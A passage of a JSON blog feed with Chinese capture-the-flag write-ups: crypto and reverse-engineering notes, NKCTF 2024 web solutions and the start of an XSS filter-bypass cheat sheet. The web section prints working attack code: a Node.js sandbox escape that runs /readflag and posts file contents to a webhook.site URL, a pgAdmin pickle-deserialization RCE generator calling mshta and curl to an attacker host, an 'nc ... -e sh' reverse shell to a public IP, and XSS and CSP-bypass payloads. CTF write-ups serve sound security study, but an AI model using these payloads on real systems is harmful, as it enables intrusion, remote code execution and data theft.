style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">∗</span><span class=\"mord\">2</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">t</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">n</span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">p</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">2</span><span class=\"mclose\">)</span><span class=\"mopen\">[</span><span class=\"mord\">0</span><span class=\"mclose\">]</span></span></span></span></span></p>\n<p>然后分析</p>\n<p>while True 的条件</p>\n<p>这里其实就是判断是否满足</p>\n<p>z (p-1)/2 ≡ -1 (mod p)</p>\n<p>z (q-1)/2 ≡ -1 (mod q)</p>\n<p>从这里我们可以判断 z 既不是模 p 下的二次剩余，也不是模 q 下的二次剩余。紧接着，它把 flag 转换成二进制然后换成十进制，又对十进制数每位逐位加密。即十进制数的每一位都是 0 或 1，加密方式如下，把每一个十进制位记作 mi 有：</p>\n<p>cipheri = secreti ** 2 * zmi (mod n) 再结合之前的 p, q =&gt;</p>\n<p>cipheri = secreti ** 2 * zmi (mod p) 和 cipheri = secreti ** 2 * zmi (mod q)</p>\n<p>我们设此时 mi = 0 或 1 时，对应的 cipheri 分别是：</p>\n<p>cipheri = secreti ** 2 (mod p) 和 cipheri = secreti ** 2 (mod q)</p>\n<p>cipheri = secreti ** 2 * z (mod p) 和 cipheri = secreti ** 2 * z (mod q)</p>\n<p>又因为 z 不是模 p 或 q 下的二次剩余，所以当 mi = 0 或 1 时，我们可以用欧拉判别式来判断 cipheri 是不是二次剩余，以此来还原每一位 mi：</p>\n<p>cipheri (p-1)/2 ≡ 1 (mod p) 或 cipheri (q-1)/2 ≡ 1 (mod q)</p>\n<h3 id=\"江枫渔火对愁眠\"><a class=\"anchor\" href=\"#江枫渔火对愁眠\">#</a> 江枫渔火对愁眠</h3>\n<p><img data-src=\"https://s2.loli.net/2024/04/21/5dYkhWExgDHNMU3.png\" alt=\"image-20240421202143481\" /></p>\n<h3 id=\"crypto签到\"><a class=\"anchor\" href=\"#crypto签到\">#</a> crypto 签到</h3>\n<p>知道 p 直接整除 N 后就是正常 rsa 解密</p>\n<h2 id=\"reserverse\"><a class=\"anchor\" href=\"#reserverse\">#</a> Reserverse</h2>\n<h3 id=\"reverse-签到\"><a class=\"anchor\" href=\"#reverse-签到\">#</a> Reverse - 签到</h3>\n<p>爆破</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;14207171201067868421&#125;</span><br><span class=\"line\">flag&#123;14207171201367868421&#125;</span><br><span class=\"line\">flag&#123;14207171231367868421&#125;</span><br><span class=\"line\">flag&#123;14237171201067868421&#125;</span><br><span class=\"line\">flag&#123;14237171231067868421&#125;</span><br><span class=\"line\">flag&#123;14237171231367868421&#125;</span><br><span class=\"line\">flag&#123;14207171231067868421&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;14207171201067868429&#125;</span><br><span class=\"line\">flag&#123;14207171201367868429&#125;</span><br><span class=\"line\">flag&#123;14207171231367868429&#125;</span><br><span class=\"line\">flag&#123;14237171201067868429&#125;</span><br><span class=\"line\">flag&#123;14237171231067868429&#125;</span><br><span class=\"line\">flag&#123;14237171231367868429&#125;</span><br><span class=\"line\">flag&#123;14207171231067868429&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;14207171201067868429&#125;</span><br><span class=\"line\">flag&#123;14207171201367868429&#125;</span><br><span class=\"line\">flag&#123;14207171231367868429&#125;</span><br><span class=\"line\">flag&#123;14237171201067868429&#125;</span><br><span class=\"line\">flag&#123;14237171231067868429&#125;</span><br><span class=\"line\">flag&#123;14237171231367868429&#125;</span><br><span class=\"line\">flag&#123;14207171231067868429&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;14207171209067868429&#125;</span><br><span class=\"line\">flag&#123;14207171209367868429&#125;</span><br><span class=\"line\">flag&#123;14207171239367868429&#125;</span><br><span class=\"line\">flag&#123;14237171209067868429&#125;</span><br><span class=\"line\">flag&#123;14237171239067868429&#125;</span><br><span class=\"line\">flag&#123;14237171239367868429&#125;</span><br><span class=\"line\">flag&#123;14207171239067868429&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;14207179209067868429&#125;</span><br><span class=\"line\">flag&#123;14207179209367868429&#125;</span><br><span class=\"line\">flag&#123;14207179239367868429&#125;</span><br><span class=\"line\">flag&#123;14237179209067868429&#125;</span><br><span class=\"line\">flag&#123;14237179239067868429&#125;</span><br><span class=\"line\">flag&#123;14237179239367868429&#125;</span><br><span class=\"line\">flag&#123;14207179239067868429&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;14207979209067868429&#125;</span><br><span class=\"line\">flag&#123;14207979209367868429&#125;</span><br><span class=\"line\">flag&#123;14207979239367868429&#125;</span><br><span class=\"line\">flag&#123;14237979209067868429&#125;</span><br><span class=\"line\">flag&#123;14237979239067868429&#125;</span><br><span class=\"line\">flag&#123;14237979239367868429&#125;</span><br><span class=\"line\">flag&#123;14207979239067868429&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;94207979209067868429&#125;</span><br><span class=\"line\">flag&#123;94207979209367868429&#125;</span><br><span class=\"line\">flag&#123;94207979239367868429&#125;</span><br><span class=\"line\">flag&#123;94237979209067868429&#125;</span><br><span class=\"line\">flag&#123;94237979239067868429&#125;</span><br><span class=\"line\">flag&#123;94237979239367868429&#125;</span><br><span class=\"line\">flag&#123;94207979239067868429&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;94207979209067868421&#125;</span><br><span class=\"line\">flag&#123;94207979209367868421&#125;</span><br><span class=\"line\">flag&#123;94207979239367868421&#125;</span><br><span class=\"line\">flag&#123;94237979209067868421&#125;</span><br><span class=\"line\">flag&#123;94237979239067868421&#125;</span><br><span class=\"line\">flag&#123;94237979239367868421&#125;</span><br><span class=\"line\">flag&#123;94207979239067868421&#125;</span><br></pre></td></tr></table></figure></p>\n<p>里面其中一个就是</p>\n<p>因为</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">9-&gt;6</span><br><span class=\"line\">1-&gt;6</span><br><span class=\"line\">3-&gt;0</span><br><span class=\"line\">0-&gt;0</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"auth-system\"><a class=\"anchor\" href=\"#auth-system\">#</a> Auth System</h3>\n<p>直接改 zf 标志为绕过跳转指令</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/hOAfCIt91BMqjmx.jpg\" alt=\"img\" /></p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> misc</h2>\n<h3 id=\"f-misc-签到\"><a class=\"anchor\" href=\"#f-misc-签到\">#</a> F | Misc - 签到 |</h3>\n<p>十进制转字符得到公众号</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/nypholfTS9IRc1C.png\" alt=\"Snipaste_2024-04-19_11-40-55\" /></p>\n<p>公众号回复得到 flag</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/6fB3dj1J9ZNMHaL.png\" alt=\"Snipaste_2024-04-19_11-43-43\" /></p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/d5vnzuC8gGjQbXl.png\" alt=\"Snipaste_2024-04-19_11-44-33\" /></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;TreJaiuLT1rgbdfG0Eay&#125;</span><br></pre></td></tr></table></figure></p>\n<hr />\n<h3 id=\"f-fm-1458\"><a class=\"anchor\" href=\"#f-fm-1458\">#</a> F | FM 145.8 |</h3>\n<p>无线电隐写，得到 flag</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/QoplI3ZTGwijk4y.png\" alt=\"Snipaste_2024-04-19_11-20-26\" /></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;19b4dD77bF3c66f91c23F5A25Bc314CB&#125;</span><br></pre></td></tr></table></figure></p>\n<hr />\n<h3 id=\"f-ez_misc\"><a class=\"anchor\" href=\"#f-ez_misc\">#</a> F | ez_misc |</h3>\n<p>伪加密解压得到 flag.rar 和 ctf.jpg。打开图片发现末尾有 snow 隐写</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/5HL4MfRSehxkmKF.png\" alt=\"Snipaste_2024-04-21_22-26-08\" /></p>\n<p>snow 隐写解密得到压缩包密码</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/ZbNOQk4JjfW9XKI.png\" alt=\"Snipaste_2024-04-21_22-27-36\" /></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Carefree and carefree</span><br></pre></td></tr></table></figure></p>\n<p>解压得到 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;b220116fc6ca827ecf3cb6c6c06dac26&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"江\"><a class=\"anchor\" href=\"#江\">#</a> 江</h3>\n<p>就先找到橙色出租车定位武汉然后再百度地图搜索金店然后打开做对比<br />\n就找到了</p>\n",
            "tags": [
                "比赛"
            ]
        },
        {
            "id": "https://lookhui.github.io/NKCTF%202024/",
            "url": "https://lookhui.github.io/NKCTF%202024/",
            "title": "NKCTF",
            "date_published": "2024-03-25T01:26:11.000Z",
            "content_html": "<h2 id=\"nkctf-2024\"><a class=\"anchor\" href=\"#nkctf-2024\">#</a> NKCTF 2024</h2>\n<h3 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> web</h3>\n<h4 id=\"my-first-cms\"><a class=\"anchor\" href=\"#my-first-cms\">#</a> my first cms</h4>\n<p>爆破密码进去直接命令执行得到 flag</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/KycNRPwgl7VuXT3.png\" alt=\"image-20240324155515773\" /></p>\n<p>参考链接</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/capture0x/CMSMadeSimple2</span><br><span class=\"line\">https://github.com/capture0x/CMSMadeSimple</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"全世界最简单的ctf\"><a class=\"anchor\" href=\"#全世界最简单的ctf\">#</a> 全世界最简单的 CTF</h4>\n<p>使用 nodejs 的 fs 模块可以读取文件，我猜测文件位置是 app/app.js 查看到源码</p>\n<p>然后使用语句</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">throw new Proxy(&#123;&#125;, &#123;</span><br><span class=\"line\">    get: function() &#123;</span><br><span class=\"line\">      const cc = arguments.callee.caller;</span><br><span class=\"line\">      const gg = (cc.constructor.constructor(`return $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;`))();</span><br><span class=\"line\">      const fs = gg.mainModule.require(&#x27;fs&#x27;).readFileSync(&#x27;/app/app.js&#x27;);</span><br><span class=\"line\">      const p = (cc.constructor.constructor(&#x27;return fetch&#x27;))();</span><br><span class=\"line\">      return p(&quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: `$&#123;fs&#125;`&#125;)&#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure></p>\n<p>即可读取到 app/app.js</p>\n<p>他源码并没有过滤掉 fork 我们正好可以利用</p>\n<p>最终脚本</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 文件写入suceess</span><br><span class=\"line\">throw new Proxy(&#123;&#125;, &#123;</span><br><span class=\"line\">    get: function() &#123;</span><br><span class=\"line\">      const cc = arguments.callee.caller;</span><br><span class=\"line\">      const gg = (cc.constructor.constructor(`return $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;`))();</span><br><span class=\"line\">let content = `</span><br><span class=\"line\">        let cs = require(&#x27;$&#123;`$&#123;&#x27;child_p&#x27;&#125;rocess&#x27;).exe`&#125;cSync(&#x27;/readflag&#x27;).toString();</span><br><span class=\"line\">        $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;.on(&quot;message&quot;,function(msg)&#123;</span><br><span class=\"line\">            fetch(&quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: cs&#125;)&#125;);</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">      `;</span><br><span class=\"line\">      const fs = gg.mainModule.require(&#x27;fs&#x27;).appendFileSync(&quot;./readflag1.js&quot;,content);</span><br><span class=\"line\">      const p = (cc.constructor.constructor(&#x27;return fetch&#x27;))();</span><br><span class=\"line\">      return p(&quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: `$&#123;fs&#125;`&#125;)&#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">//通信成功</span><br><span class=\"line\">throw new Proxy(&#123;&#125;, &#123;</span><br><span class=\"line\">    get: function() &#123;</span><br><span class=\"line\">      const cc = arguments.callee.caller;</span><br><span class=\"line\">      const g = (cc.constructor.constructor(`return $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;`))();</span><br><span class=\"line\">      const h = g.mainModule.require(`$&#123;&#x27;child_p&#x27;&#125;rocess`).fork(&#x27;./readflag1.js&#x27;);</span><br><span class=\"line\">      h.send(&#x27;hello&#x27;);</span><br><span class=\"line\">      const p = (cc.constructor.constructor(&#x27;return fetch&#x27;))();</span><br><span class=\"line\">      return p(&quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: `$&#123;h&#125;`&#125;)&#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure></p>\n<p>注意过滤即可</p>\n<h4 id=\"attack_tacooooo\"><a class=\"anchor\" href=\"#attack_tacooooo\">#</a> attack_tacooooo</h4>\n<p>参考链接</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/</span><br></pre></td></tr></table></figure></p>\n<p>脚本如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import struct</span><br><span class=\"line\">import sys</span><br><span class=\"line\"></span><br><span class=\"line\">def produce_pickle_bytes(platform, cmd):</span><br><span class=\"line\">    b = b&#x27;\\x80\\x04\\x95&#x27;</span><br><span class=\"line\">    b += struct.pack(&#x27;L&#x27;, 22 + len(platform) + len(cmd))</span><br><span class=\"line\">    b += b&#x27;\\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(platform)) + platform.encode()</span><br><span class=\"line\">    b += b&#x27;\\x94\\x8c\\x06system\\x94\\x93\\x94&#x27;</span><br><span class=\"line\">    b += b&#x27;\\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(cmd)) + cmd.encode()</span><br><span class=\"line\">    b += b&#x27;\\x94\\x85\\x94R\\x94.&#x27;</span><br><span class=\"line\">    print(b)</span><br><span class=\"line\">    return b</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    if len(sys.argv) != 2:</span><br><span class=\"line\">        exit(f&quot;usage: &#123;sys.argv[0]&#125; ip:port&quot;)</span><br><span class=\"line\">    with open(&#x27;nt.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class=\"line\">        f.write(produce_pickle_bytes(&#x27;nt&#x27;, f&quot;mshta.exe http://&#123;HOST&#125;/&quot;))</span><br><span class=\"line\">    with open(&#x27;posix.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class=\"line\">        f.write(produce_pickle_bytes(&#x27;posix&#x27;, f&quot;curl http://&#123;HOST&#125;/&quot;))</span><br></pre></td></tr></table></figure></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1zbWJzZXJ2ZXItdTc1bm9vczg3dms0NGYucHk=\">还有一个 smbserver.py</span></p>\n<p>首先要知道这个漏洞是因为 join 去合并拼接产生</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">此函数有两个缺点：</span><br><span class=\"line\"></span><br><span class=\"line\">它没有设置不应转义的受信任基路径，因此返回 。os.path.join(&quot;/opt/safe/&quot;, &quot;../../etc/passwd&quot;)/etc/passwd</span><br><span class=\"line\">它在其参数中使用最右边的绝对路径作为根路径，因此返回 。os.path.join(&quot;./safe/&quot;, &quot;do_not_escape_from_here&quot;, &quot;/etc/passwd&quot;)/etc/passwd</span><br></pre></td></tr></table></figure></p>\n<p>比赛题目环境是由 docker 容器搭建</p>\n<p>环境内无 curl 以及 bash</p>\n<p>但是有 nc 可以利用 nc 来达到反弹 shell</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc 8.137.131.159 9006 -e sh</span><br></pre></td></tr></table></figure></p>\n<p>并且下面是需要利用</p>\n<p>pga4_session 来构造反序列化</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /browser/ HTTP/1.1</span><br><span class=\"line\">Host: 7d4eaaa6-c6d5-487e-a1d4-65986d6adb85.node.nkctf.yuzhian.com.cn</span><br><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\">Referer: http://7d4eaaa6-c6d5-487e-a1d4-65986d6adb85.node.nkctf.yuzhian.com.cn/login?next=%2F</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: pga4_session=../storage/tacooooo_qq.com/posix.pickle!baeac19e-2dcc-4d96-a4c7-1ff410ddd8c2!AZleysLS+ZnrL20IU1mGt6lHxXc3O8/It0JHyC4sJqA=; PGADMIN_LANGUAGE=en</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure></p>\n<p>构造如上，路径无所谓</p>\n<p>公网 ip 监听端口即可</p>\n",
            "tags": [
                "比赛"
            ]
        },
        {
            "id": "https://lookhui.github.io/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/",
            "url": "https://lookhui.github.io/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/",
            "title": "小工具",
            "date_published": "2024-03-09T12:25:51.000Z",
            "content_html": "<h2 id=\"xss注入\"><a class=\"anchor\" href=\"#xss注入\">#</a> XSS 注入</h2>\n<h3 id=\"xss绕waf\"><a class=\"anchor\" href=\"#xss绕waf\">#</a> XSS 绕 WAF</h3>\n<h4 id=\"编码混淆\"><a class=\"anchor\" href=\"#编码混淆\">#</a> <strong>编码混淆</strong></h4>\n<ul>\n<li>\n<h6 id=\"html-实体编码绕过\"><a class=\"anchor\" href=\"#html-实体编码绕过\">#</a> <strong>HTML 实体编码绕过</strong>：</h6>\n<p>html</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 服务端过滤 &lt;script&gt; 但未递归解码 --&gt;</span><br><span class=\"line\">&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; → 二次解码后执行</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<h6 id=\"jsfuck-等极端混淆\"><a class=\"anchor\" href=\"#jsfuck-等极端混淆\">#</a> <strong>JSFuck 等极端混淆</strong>：</h6>\n<p>用  <code>[]()!+</code>  等 6 个字符构造有效代码：</p>\n<p>javascript</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]...](&quot;alert(1)&quot;)()</span><br></pre></td></tr></table></figure></p>\n</li>\n</ul>\n<h5 id=\"上下文感知绕过\"><a class=\"anchor\" href=\"#上下文感知绕过\">#</a> <strong>上下文感知绕过</strong></h5>\n<ul>\n<li>\n<h6 id=\"在-javascript-字符串中\"><a class=\"anchor\" href=\"#在-javascript-字符串中\">#</a> <strong>在 JavaScript 字符串中</strong>：</h6>\n<p>javascript</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 原始输入：userInput = &quot;user-data&quot;; </span><br><span class=\"line\">let data = &quot;User: &quot; + userInput; // 期望字符串</span><br><span class=\"line\">// 攻击：闭合字符串并执行代码</span><br><span class=\"line\">userInput = &#x27;&quot;;alert(1);//&#x27; </span><br><span class=\"line\">// 结果：let data = &quot;User: &quot;&quot;;alert(1);//&quot;;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<h6 id=\"在-html-属性中\"><a class=\"anchor\" href=\"#在-html-属性中\">#</a> <strong>在 HTML 属性中</strong>：</h6>\n<p>html</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 基础过滤：禁止 onerror --&gt;</span><br><span class=\"line\">&lt;img src=&quot;x&quot; alt=&quot;test&quot; onload=alert(1)&gt; &lt;!-- 尝试其他事件 --&gt;</span><br><span class=\"line\">&lt;!-- 利用无引号属性 --&gt;</span><br><span class=\"line\">&lt;img src=x%20onerror=alert(1)&gt; </span><br></pre></td></tr></table></figure></p>\n</li>\n</ul>\n<h5 id=\"绕过-csp-限制\"><a class=\"anchor\" href=\"#绕过-csp-限制\">#</a> <strong>绕过 CSP 限制</strong></h5>\n<ul>\n<li>\n<h6 id=\"jsonp-端点滥用\"><a class=\"anchor\" href=\"#jsonp-端点滥用\">#</a> <strong>JSONP 端点滥用</strong>：</h6>\n<p>html</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 假设CSP允许：script-src &#x27;self&#x27; api.example.com --&gt;</span><br><span class=\"line\">&lt;script src=&quot;https://api.example.com/jsonp?callback=alert(1)&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<h6 id=\"angularjs-沙箱逃逸cve-2016-9079\"><a class=\"anchor\" href=\"#angularjs-沙箱逃逸cve-2016-9079\">#</a> <strong>AngularJS 沙箱逃逸</strong>（CVE-2016-9079）：</h6>\n<p>javascript</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;x = &#123;&#x27;y&#x27;:&#x27;&#x27;.constructor.prototype&#125;; 